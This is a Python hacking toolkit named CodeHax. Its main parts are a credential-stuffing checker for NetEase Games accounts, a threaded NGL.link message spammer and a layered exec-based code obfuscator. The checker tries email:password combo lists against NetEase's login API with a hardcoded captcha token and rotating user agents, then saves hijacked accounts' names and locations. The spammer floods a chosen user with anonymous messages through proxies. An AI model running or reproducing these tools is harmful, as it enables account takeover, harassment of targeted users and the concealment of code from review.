#!/usr/bin/env python3
"""
Enhanced Universal Python Obfuscator / Decoder + NGL Spammer + Self‑Updater + NetEase Checker
Made by @ItsMeJeff
v4.1
"""

import argparse
import base64
import dis
import hashlib
import importlib
import json
import logging
import marshal
import os
import random
import re
import shutil
import struct
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import types
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import StringIO
from pathlib import Path
from typing import Optional, List

import requests

# ----------------------------------------------------------------------
# Optional rich interface (falls back gracefully)
# ----------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.table import Table
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    Console = None
    Panel = None
    Prompt = None
    Confirm = None
    Table = None

# ----------------------------------------------------------------------
# Optional colorama (for NetEase checker)
# ----------------------------------------------------------------------
try:
    from colorama import init, Fore, Style
    init()
    COLORAMA_AVAILABLE = True
except ImportError:
    class DummyFore:
        RED = ''; GREEN = ''; YELLOW = ''; CYAN = ''; RESET = ''
    class DummyStyle:
        RESET_ALL = ''
    Fore = DummyFore()
    Style = DummyStyle()
    def init(): pass
    COLORAMA_AVAILABLE = False

# ----------------------------------------------------------------------
# Optional fake_useragent (for NetEase checker)
# ----------------------------------------------------------------------
try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except ImportError:
    UA_AVAILABLE = False

# ----------------------------------------------------------------------
# Logging
# ----------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("CodeHax")

# ----------------------------------------------------------------------
# Constants
# ----------------------------------------------------------------------
VERSION = "4.1"
UPDATE_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/main.py"
NGL_API_URL = "https://ngl.link/api/submit"

# ----------------------------------------------------------------------
# ASCII art for the main menu (only)
# ----------------------------------------------------------------------
ASCII_ART = r"""
 __    __     __  __     __         ______   __        ______   ______     ______     __        
/\ "-./  \   /\ \/\ \   /\ \       /\__  _\ /\ \      /\__  _\ /\  __ \   /\  __ \   /\ \       
\ \ \-./\ \  \ \ \_\ \  \ \ \____  \/_/\ \/ \ \ \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  
 \ \_\ \ \_\  \ \_____\  \ \_____\    \ \_\  \ \_\       \ \_\  \ \_____\  \ \_____\  \ \_____\ 
  \/_/  \/_/   \/_____/   \/_____/     \/_/   \/_/        \/_/   \/_____/   \/_____/   \/_____/ 
"""

# ----------------------------------------------------------------------
# Console helpers (Rich or fallback)
# ----------------------------------------------------------------------
if RICH_AVAILABLE:
    console = Console()
else:
    class ConsoleFallback:
        def print(self, *args, **kwargs):
            print(*args)
    console = ConsoleFallback()

def rich_prompt(msg: str, default: str = "", choices: list = None) -> str:
    if RICH_AVAILABLE and Prompt:
        return Prompt.ask(msg, default=default, choices=choices)
    prompt = f"{msg} " + (f"({default}) " if default else "")
    resp = input(prompt)
    return resp if resp else default

def rich_confirm(msg: str, default: bool = True) -> bool:
    if RICH_AVAILABLE and Confirm:
        return Confirm.ask(msg, default=default)
    resp = input(f"{msg} (Y/n) ").strip().lower()
    if not resp:
        return default
    return resp in ("y", "yes")

# ----------------------------------------------------------------------
# Decoding engines
# ----------------------------------------------------------------------
def decode_layer_v1(encoded_str: str) -> Optional[str]:
    try:
        cleaned = encoded_str.strip().strip("'\"")
        b64_bytes = base64.b64decode(cleaned)
        reversed_str = b64_bytes.decode("utf-8")[::-1]
        compressed = base64.b64decode(reversed_str)
        return zlib.decompress(compressed).decode("utf-8")
    except Exception:
        return None

def extract_pyobfuscate_payload(source: str) -> Optional[str]:
    m = re.search(r"exec\(\(_\)\(b'([^']*)'\)\)", source)
    return m.group(1) if m else None

def try_uncompyle6(code_obj: types.CodeType) -> Optional[str]:
    try:
        from uncompyle6.main import decompile
    except ImportError:
        return None
    for ver in (3.12, 3.11, 3.10, 3.9, 3.8, 3.7, 3.6, 3.5, 2.7):
        try:
            buf = StringIO()
            decompile(ver, code_obj, out=buf)
            res = buf.getvalue().strip()
            if res:
                log.info(f"Decompiled with uncompyle6 (Python {ver})")
                return res
        except Exception:
            continue
    return None

def try_decompyle3(code_obj: types.CodeType) -> Optional[str]:
    try:
        from decompyle3.main import decompile as d3decomp
    except ImportError:
        return None
    for ver in (3.7, 3.8, 3.9, 3.10, 3.11):
        try:
            buf = StringIO()
            d3decomp(ver, code_obj, out=buf)
            res = buf.getvalue().strip()
            if res:
                log.info(f"Decompiled with decompyle3 (Python {ver})")
                return res
        except Exception:
            continue
    return None

def try_pycdc(code_obj: types.CodeType) -> Optional[str]:
    if not shutil.which("pycdc"):
        return None
    try:
        magic = importlib.util.MAGIC_NUMBER
        fd, tmp_path = tempfile.mkstemp(suffix=".pyc")
        with open(tmp_path, "wb") as f:
            f.write(magic)
            f.write(struct.pack("<i", int(time.time())))
            f.write(struct.pack("<i", len(marshal.dumps(code_obj))))
            f.write(marshal.dumps(code_obj))
        result = subprocess.run(
            ["pycdc", tmp_path],
            capture_output=True,
            text=True,
            timeout=15
        )
        os.unlink(tmp_path)
        if result.returncode == 0 and result.stdout.strip():
            log.info("Decompiled with pycdc")
            return result.stdout
    except Exception as e:
        log.debug(f"pycdc error: {e}")
    return None

def decompile_fallback(code_obj: types.CodeType) -> Optional[str]:
    out_path = Path("raw_bytecode.marshal")
    marshal.dump(code_obj, out_path.open("wb"))
    log.warning(f"All decompilers failed. Raw bytecode saved to {out_path}")
    try:
        buf = StringIO()
        dis.disassemble(code_obj, file=buf)
        lines = buf.getvalue().splitlines()[:20]
        snippet = "\n".join(lines)
        log.info(f"Disassembly preview:\n{snippet}")
    except Exception:
        pass
    return None

def decode_pyobfuscate_file(file_path: str) -> Optional[str]:
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    payload = extract_pyobfuscate_payload(content)
    if not payload:
        log.error("No PyObfuscate payload found.")
        return None
    reversed_payload = payload[::-1]
    try:
        compressed_data = base64.b64decode(reversed_payload)
    except Exception as e:
        log.error(f"Base64 decode failed: {e}")
        return None
    try:
        marshal_bytes = zlib.decompress(compressed_data)
    except Exception as e:
        log.error(f"zlib decompression failed: {e}")
        return None
    try:
        code_obj = marshal.loads(marshal_bytes)
    except Exception as e:
        log.error(f"marshal.loads failed: {e}")
        return None
    if not isinstance(code_obj, types.CodeType):
        log.error("Extracted object is not a code object.")
        return None
    for decompiler in (try_uncompyle6, try_decompyle3, try_pycdc):
        result = decompiler(code_obj)
        if result:
            return result
    return decompile_fallback(code_obj)

def auto_decode(file_path: str) -> Optional[str]:
    if not os.path.isfile(file_path):
        log.error(f"File not found: {file_path}")
        return None
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    if extract_pyobfuscate_payload(content):
        log.info("Detected PyObfuscate style.")
        return decode_pyobfuscate_file(file_path)
    m = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', content)
    if m:
        log.info("Detected Protected Loader v1.0 style.")
        decoded = decode_layer_v1(m.group(1))
        if decoded is None:
            log.error("Initial layer decoding failed.")
            return None
        while re.search(r'encoded\s*=\s*["\']', decoded):
            inner = re.search(r'encoded\s*=\s*["\']([^"\']+)["\']', decoded)
            if inner:
                decoded = decode_layer_v1(inner.group(1))
                if decoded is None:
                    log.error("Layer decoding failed.")
                    return None
            else:
                break
        return decoded
    log.info("No known header detected. Trying raw base64...")
    raw = content.strip().strip("'\"")
    decoded = decode_layer_v1(raw)
    if decoded:
        return decoded
    log.error("All decoding attempts failed.")
    return None

# ----------------------------------------------------------------------
# Obfuscation engines
# ----------------------------------------------------------------------
class Obfuscator:
    @staticmethod
    def one_layer_text(code: str) -> str:
        compressed = zlib.compress(code.encode("utf-8"))
        b64_1 = base64.b64encode(compressed).decode("ascii")
        reversed1 = b64_1[::-1]
        return base64.b64encode(reversed1.encode("ascii")).decode("ascii")

    @staticmethod
    def one_layer_marshal(code: str) -> str:
        code_obj = compile(code, "<obf>", "exec")
        marshal_data = marshal.dumps(code_obj)
        compressed = zlib.compress(marshal_data)
        b64_1 = base64.b64encode(compressed).decode("ascii")
        reversed1 = b64_1[::-1]
        return base64.b64encode(reversed1.encode("ascii")).decode("ascii")

    @staticmethod
    def generate_loader(payload: str, author: str = "@ItsMeJeff") -> str:
        return textwrap.dedent(f"""\
        # Author: {author}
        # Developer: {author}
        # Protected Code Loader

        import base64, zlib, sys

        def decode_me():
            print(\"\"\"
            ╔══════════════════════════════════════╗
            ║     Protected Python Loader v1.0     ║
            ║        Cracked By: {author:<12}║
            ║       Full credit: {author:<13}║
            ╚══════════════════════════════════════╝
            \"\"\")

        def decode_and_run():
            try:
                decode_me()
                encoded = "{payload}"
                layer1 = base64.b64decode(encoded.encode()).decode()
                layer2 = layer1[::-1]
                layer3 = base64.b64decode(layer2.encode())
                original = zlib.decompress(layer3).decode()
                exec(original, {{'__name__': '__main__'}})
            except Exception as e:
                print("Error:", e)
                sys.exit(1)

        if __name__ == "__main__":
            decode_and_run()
        """)

    @staticmethod
    def generate_marshal_loader(payload_b64: str, author: str = "@ItsMeJeff") -> str:
        return textwrap.dedent(f"""\
        # Author: {author}
        # Obfuscated with PyObfuscate style
        _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))
        exec((_)(b'{payload_b64}'))
        """)

    def obfuscate_file(self, source_path: str, mode: str = "marshal",
                       layers: int = 1, author: str = "@ItsMeJeff") -> str:
        if not os.path.isfile(source_path):
            raise FileNotFoundError(source_path)
        with open(source_path, "r", encoding="utf-8") as f:
            original_code = f.read()
        payload = original_code
        for i in range(layers):
            if mode == "marshal":
                payload = self.one_layer_marshal(payload)
            else:
                payload = self.one_layer_text(payload)
            log.info(f"Applied {mode} layer {i+1}/{layers}")
        final_code = self.generate_marshal_loader(payload, author) if mode == "marshal" \
                     else self.generate_loader(payload, author)
        out_path = Path(source_path).stem + "_obfuscated.py"
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(final_code)
        log.info(f"Obfuscated file saved to {out_path}")
        return out_path

# ----------------------------------------------------------------------
# NGL Spammer
# ----------------------------------------------------------------------
class NGLSpammer:
    def __init__(self, username: str, message: str, quantity: int,
                 extra_message: str = None, proxies: List[str] = None,
                 threads: int = 10):
        self.username = username
        self.message = message
        self.extra_message = extra_message or message
        self.quantity = quantity
        self.proxies = proxies or []
        self.threads = threads
        self.success = 0
        self.failures = 0
        self.lock = threading.Lock()

    def _send_one(self, idx: int):
        session = requests.Session()
        if self.proxies:
            proxy = self.proxies[idx % len(self.proxies)]
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            "authority": "ngl.link",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://ngl.link",
            "referer": f"https://ngl.link/{self.username}",
            "x-requested-with": "XMLHttpRequest",
        }
        payload = {
            "username": self.username,
            "question": self.extra_message,
            "deviceId": "b8803802-3b9a-4f58-81dd-b0483418aecc",
            "gameSlug": "",
            "referrer": "",
        }
        try:
            resp = session.post(NGL_API_URL, headers=headers, data=payload, timeout=10)
            if resp.status_code == 200:
                with self.lock:
                    self.success += 1
                log.debug(f"✔ Sent #{idx+1}")
            else:
                with self.lock:
                    self.failures += 1
                log.debug(f"✖ Failed #{idx+1} (status {resp.status_code})")
        except Exception as e:
            with self.lock:
                self.failures += 1
            log.debug(f"✖ Exception #{idx+1}: {e}")
        time.sleep(0.2 + (hash(str(idx)) % 4) * 0.1)

    def run(self):
        log.info(f"Starting NGL spam: {self.quantity} messages to @{self.username}")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._send_one, i) for i in range(self.quantity)]
            for future in as_completed(futures):
                future.result()
        log.info(f"Completed: {self.success} sent, {self.failures} failed.")

# ----------------------------------------------------------------------
# Netease Account Checker (pure function, no banner)
# ----------------------------------------------------------------------
class NeteaseGamesChecker:
    def __init__(self, threads=10):
        self.session = requests.Session()
        self.threads = threads
        self.success = 0
        self.failed = 0
        self.invalid_pass = 0
        self.errors = 0
        self.counter_lock = threading.Lock()
        self.file_lock = threading.Lock()

    def get_md5(self, password):
        return hashlib.md5(password.encode()).hexdigest()

    def get_random_ua(self):
        if UA_AVAILABLE:
            return UserAgent().random
        fallback_uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        return random.choice(fallback_uas)

    def save_results(self, result_type, account, extra=""):
        with self.file_lock:
            with open(f"{result_type}.txt", "a") as f:
                f.write(f"{account} {extra}\n")

    def check_account(self, account_data):
        try:
            email, password = account_data.split(":", 1)
            email = email.strip()
            password = password.strip()

            md5_pwd = self.get_md5(password)
            random_ua = self.get_random_ua()

            login_url = "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US"
            login_data = {
                "account": email,
                "hash_password": md5_pwd,
                "client_id": "official",
                "response_type": "cookie",
                "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
                "state": "official_state"
            }
            headers = {
                "Pragma": "no-cache",
                "Accept": "*/*",
                "User-Agent": random_ua,
                "recaptcha-token": "HFaDRze01XOl9xfTpGRh5XR1MpM2ZsE0FzP2wvEUggGWxyPWRlA0JmGW9IWW5TK3EYfXVbDEcAQQFFcC4hdk0SbRE_Pz1bahN9KD9idQMjLBJ7ThUiRT9hQipjbBgXGzNTST91anc_CTFWbT5bSDsSOkd1YW5PM3BvaAUSbTx6eQsqeDZTRVAAHxp6byR7YzQhZQJDdFggGicjaTgyVGI3dChURScMSiteLDdrDEcHGjQUMmg2AykFamVcbBhZZgV8KX94PhkjOQR_WhEoQSEqUmttJkcHGzNTST91anc_CTElMxdUTjhSLDMjPkFGPGpXJFMCbTxwcTIWSHoAHwdXWgZ0bzA7DwQ9ezgzFDlxQzotZDRlAzcwXzxSSScMSixMPi57QFRedgZFYSlhYD4FemVZKEkIQ0crFmhuPAs-LyMsbgk_XH9RSFNkR00LDEcAD25ZLzx-aA"
            }

            r = self.session.post(login_url, data=login_data, headers=headers, timeout=10)
            response = r.json()

            with self.file_lock:
                with open("responses.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n{email}:{password}\n")
                    f.write(json.dumps(response, indent=2))
                    f.write("\n" + "=" * 50 + "\n")

            if response.get("code") == 1006:
                print(f"{Fore.RED}[INVALID] {email}:{password} - Incorrect password{Style.RESET_ALL}")
                with self.counter_lock:
                    self.invalid_pass += 1
                self.save_results("invalid", f"{email}:{password}", "Invalid password")
                return

            if "Account does not exist" in r.text:
                print(f"{Fore.RED}[FAIL] {email}:{password} - Account does not exist{Style.RESET_ALL}")
                with self.counter_lock:
                    self.failed += 1
                self.save_results("failed", f"{email}:{password}", "Account does not exist")
                return

            if response.get("code") == 0:
                info_url = "https://account.neteasegames.com/ucenter/user/info?lang=en_US"
                info_headers = {
                    "User-Agent": random_ua,
                    "Pragma": "no-cache",
                    "Accept": "*/*"
                }
                r = self.session.get(info_url, headers=info_headers, timeout=10)
                info = r.json()
                user_id = info["user"]["user_id"]
                name = info["user"]["account_name"]
                location = info["user"]["location"]
                result = f"""
{Fore.GREEN}[SUCCESS] {email}:{password}
User ID: {user_id}
Name: {name}
Location: {location}{Style.RESET_ALL}"""
                print(result)
                with self.counter_lock:
                    self.success += 1
                self.save_results("success", f"{email}:{password}",
                                  f"ID:{user_id} | Name:{name} | Location:{location}")
            else:
                error_msg = response.get("message", "Unknown error")
                print(f"{Fore.RED}[FAIL] {email}:{password} - {error_msg}{Style.RESET_ALL}")
                with self.counter_lock:
                    self.failed += 1
                self.save_results("failed", f"{email}:{password}", error_msg)

        except Exception as e:
            print(f"{Fore.RED}[ERROR] {email}:{password} - {str(e)}{Style.RESET_ALL}")
            with self.counter_lock:
                self.errors += 1
            self.save_results("errors", f"{email}:{password}", str(e))

    def print_results(self):
        total = self.success + self.failed + self.invalid_pass + self.errors
        print(f"""
{Fore.CYAN}Results Summary:
Total Checked: {total}
Success: {Fore.GREEN}{self.success}{Fore.CYAN}
Failed: {Fore.RED}{self.failed}{Fore.CYAN}
Invalid Pass: {Fore.YELLOW}{self.invalid_pass}{Fore.CYAN}
Errors: {Fore.RED}{self.errors}{Fore.CYAN}

Results saved to:
- success.txt
- failed.txt
- invalid.txt
- errors.txt
- responses.txt{Style.RESET_ALL}
""")

    def start(self, filename=None):
        if not filename:
            filename = input(f"{Fore.YELLOW}Enter accounts file name: {Style.RESET_ALL}")
        try:
            with open(filename) as f:
                accounts = f.read().splitlines()
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] File not found!{Style.RESET_ALL}")
            return
        print(f"\n{Fore.CYAN}Loaded {len(accounts)} accounts{Style.RESET_ALL}\n")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.check_account, accounts)
        self.print_results()

# ----------------------------------------------------------------------
# Self‑updater
# ----------------------------------------------------------------------
def self_update(restart: bool = True):
    log.info("Checking for updates...")
    try:
        response = requests.get(UPDATE_URL, timeout=10)
        response.raise_for_status()
        new_code = response.text
        current_path = Path(sys.argv[0])
        current_code = current_path.read_text(encoding="utf-8")
        if new_code == current_code:
            log.info("Already up to date.")
            return False
        log.info("New version found! Updating...")
        tmp_path = current_path.with_suffix(".py.tmp")
        tmp_path.write_text(new_code, encoding="utf-8")
        try:
            compile(new_code, str(tmp_path), "exec")
        except SyntaxError as e:
            log.error(f"Downloaded code contains syntax error: {e}")
            tmp_path.unlink()
            return False
        shutil.move(str(tmp_path), str(current_path))
        log.info("Update applied successfully.")
        if restart:
            log.info("Restarting...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        return True
    except Exception as e:
        log.error(f"Update failed: {e}")
        return False

# ----------------------------------------------------------------------
# Interactive menu
# ----------------------------------------------------------------------
def interactive_menu():
    while True:
        if RICH_AVAILABLE:
            console.clear()
            console.print(ASCII_ART, style="bold cyan")
            console.print(Panel.fit(
                "[bold bright_cyan]🛡️ Universal Python Obfuscator / Decoder + NGL Spammer + NetEase Checker[/bold bright_cyan]\n"
                f"v{VERSION} – Made by @ItsMeJeff",
                border_style="bright_cyan"))
            table = Table(show_header=False, box=None)
            table.add_row("[bold][1][/bold] Decode a file")
            table.add_row("[bold][2][/bold] Obfuscate a file")
            table.add_row("[bold][3][/bold] NGL Spammer")
            table.add_row("[bold][4][/bold] NetEase Account Checker")
            table.add_row("[bold][5][/bold] Check for updates")
            table.add_row("[bold][6][/bold] Exit")
            console.print(table)
            choice = rich_prompt("Select", choices=["1","2","3","4","5","6"], default="1")
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(ASCII_ART)
            print("\n=== CodeHax v{VERSION} ===\n"
                  "[1] Decode\n"
                  "[2] Obfuscate\n"
                  "[3] NGL Spammer\n"
                  "[4] NetEase Checker\n"
                  "[5] Update\n"
                  "[6] Exit")
            choice = input("Choice: ").strip()

        if choice == "1":
            file_path = rich_prompt("Obfuscated file path")
            decoded = auto_decode(file_path)
            if decoded:
                out_path = Path(file_path).stem + "_decoded.py"
                with open(out_path, "w", encoding="utf-8") as f:
                    f.write(decoded)
                log.info(f"Decoded file saved to {out_path}")
                preview = "\n".join(decoded.splitlines()[:15])
                if len(decoded.splitlines()) > 15:
                    preview += "\n..."
                print(preview)
            else:
                log.error("Decoding failed.")

        elif choice == "2":
            src = rich_prompt("File to obfuscate")
            mode = rich_prompt("Mode (marshal/text)", choices=["marshal", "text"], default="marshal")
            layers = int(rich_prompt("Layers (1-10)", default="1"))
            author = rich_prompt("Author", default="@ItsMeJeff")
            obf = Obfuscator()
            try:
                obf.obfuscate_file(src, mode=mode, layers=layers, author=author)
            except Exception as e:
                log.error(f"Obfuscation failed: {e}")

        elif choice == "3":
            username = rich_prompt("Target username")
            message = rich_prompt("Message")
            quantity = int(rich_prompt("Number of messages", default="10"))
            extra = rich_confirm("Add extra message?", default=False)
            extra_msg = rich_prompt("Extra message") if extra else message
            threads = int(rich_prompt("Threads", default="10"))
            proxies_input = rich_prompt("Proxy list (comma separated) or leave empty", default="")
            proxies = [p.strip() for p in proxies_input.split(",") if p.strip()] if proxies_input else []
            spammer = NGLSpammer(username, message, quantity, extra_msg, proxies, threads)
            spammer.run()

        elif choice == "4":
            threads = int(rich_prompt("Threads", default="10"))
            checker = NeteaseGamesChecker(threads=threads)
            checker.start()

        elif choice == "5":
            self_update(restart=True)

        elif choice == "6":
            sys.exit(0)

        input("\nPress Enter to continue...")

# ----------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------
def create_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=f"CodeHax v{VERSION} – Universal Python Obfuscator / Decoder + NGL Spammer + NetEase Checker",
        epilog="If no arguments are given, the interactive menu starts."
    )
    subparsers = parser.add_subparsers(dest="command", help="Operation to perform")

    # Decode
    decode_parser = subparsers.add_parser("decode", help="Decode an obfuscated file")
    decode_parser.add_argument("file", help="Path to the obfuscated file")
    decode_parser.add_argument("-o", "--output", help="Output file name (default: <input>_decoded.py)")

    # Obfuscate
    encrypt_parser = subparsers.add_parser("obfuscate", help="Obfuscate a Python file")
    encrypt_parser.add_argument("file", help="Path to the source file")
    encrypt_parser.add_argument("-m", "--mode", choices=["marshal", "text"], default="marshal")
    encrypt_parser.add_argument("-l", "--layers", type=int, default=1, choices=range(1,11))
    encrypt_parser.add_argument("-a", "--author", default="@ItsMeJeff")
    encrypt_parser.add_argument("-o", "--output")

    # NGL
    ngl_parser = subparsers.add_parser("ngl", help="NGL spam campaign")
    ngl_parser.add_argument("username")
    ngl_parser.add_argument("message")
    ngl_parser.add_argument("-q", "--quantity", type=int, default=10)
    ngl_parser.add_argument("-e", "--extra")
    ngl_parser.add_argument("-t", "--threads", type=int, default=10)
    ngl_parser.add_argument("-p", "--proxies", nargs="*")

    # NetEase
    netease_parser = subparsers.add_parser("netease", help="NetEase account checker")
    netease_parser.add_argument("file", help="File with accounts (email:password)")
    netease_parser.add_argument("-t", "--threads", type=int, default=10)

    # Update
    subparsers.add_parser("update", help="Check for updates and replace current script")

    return parser

def main():
    parser = create_parser()
    args = parser.parse_args()

    if args.command is None:
        interactive_menu()
        return

    if args.command == "decode":
        decoded = auto_decode(args.file)
        if decoded:
            out_path = args.output or (Path(args.file).stem + "_decoded.py")
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(decoded)
            log.info(f"Decoded file saved to {out_path}")
        else:
            log.error("Decoding failed.")
            sys.exit(1)

    elif args.command == "obfuscate":
        obf = Obfuscator()
        try:
            out = obf.obfuscate_file(args.file, args.mode, args.layers, args.author)
            if args.output:
                shutil.move(out, args.output)
                log.info(f"Output moved to {args.output}")
        except Exception as e:
            log.error(f"Obfuscation failed: {e}")
            sys.exit(1)

    elif args.command == "ngl":
        spammer = NGLSpammer(
            username=args.username,
            message=args.message,
            quantity=args.quantity,
            extra_message=args.extra,
            proxies=args.proxies or [],
            threads=args.threads,
        )
        spammer.run()

    elif args.command == "netease":
        checker = NeteaseGamesChecker(threads=args.threads)
        checker.start(filename=args.file)

    elif args.command == "update":
        updated = self_update(restart=True)
        if not updated:
            sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.warning("Interrupted by user")
        sys.exit(1)
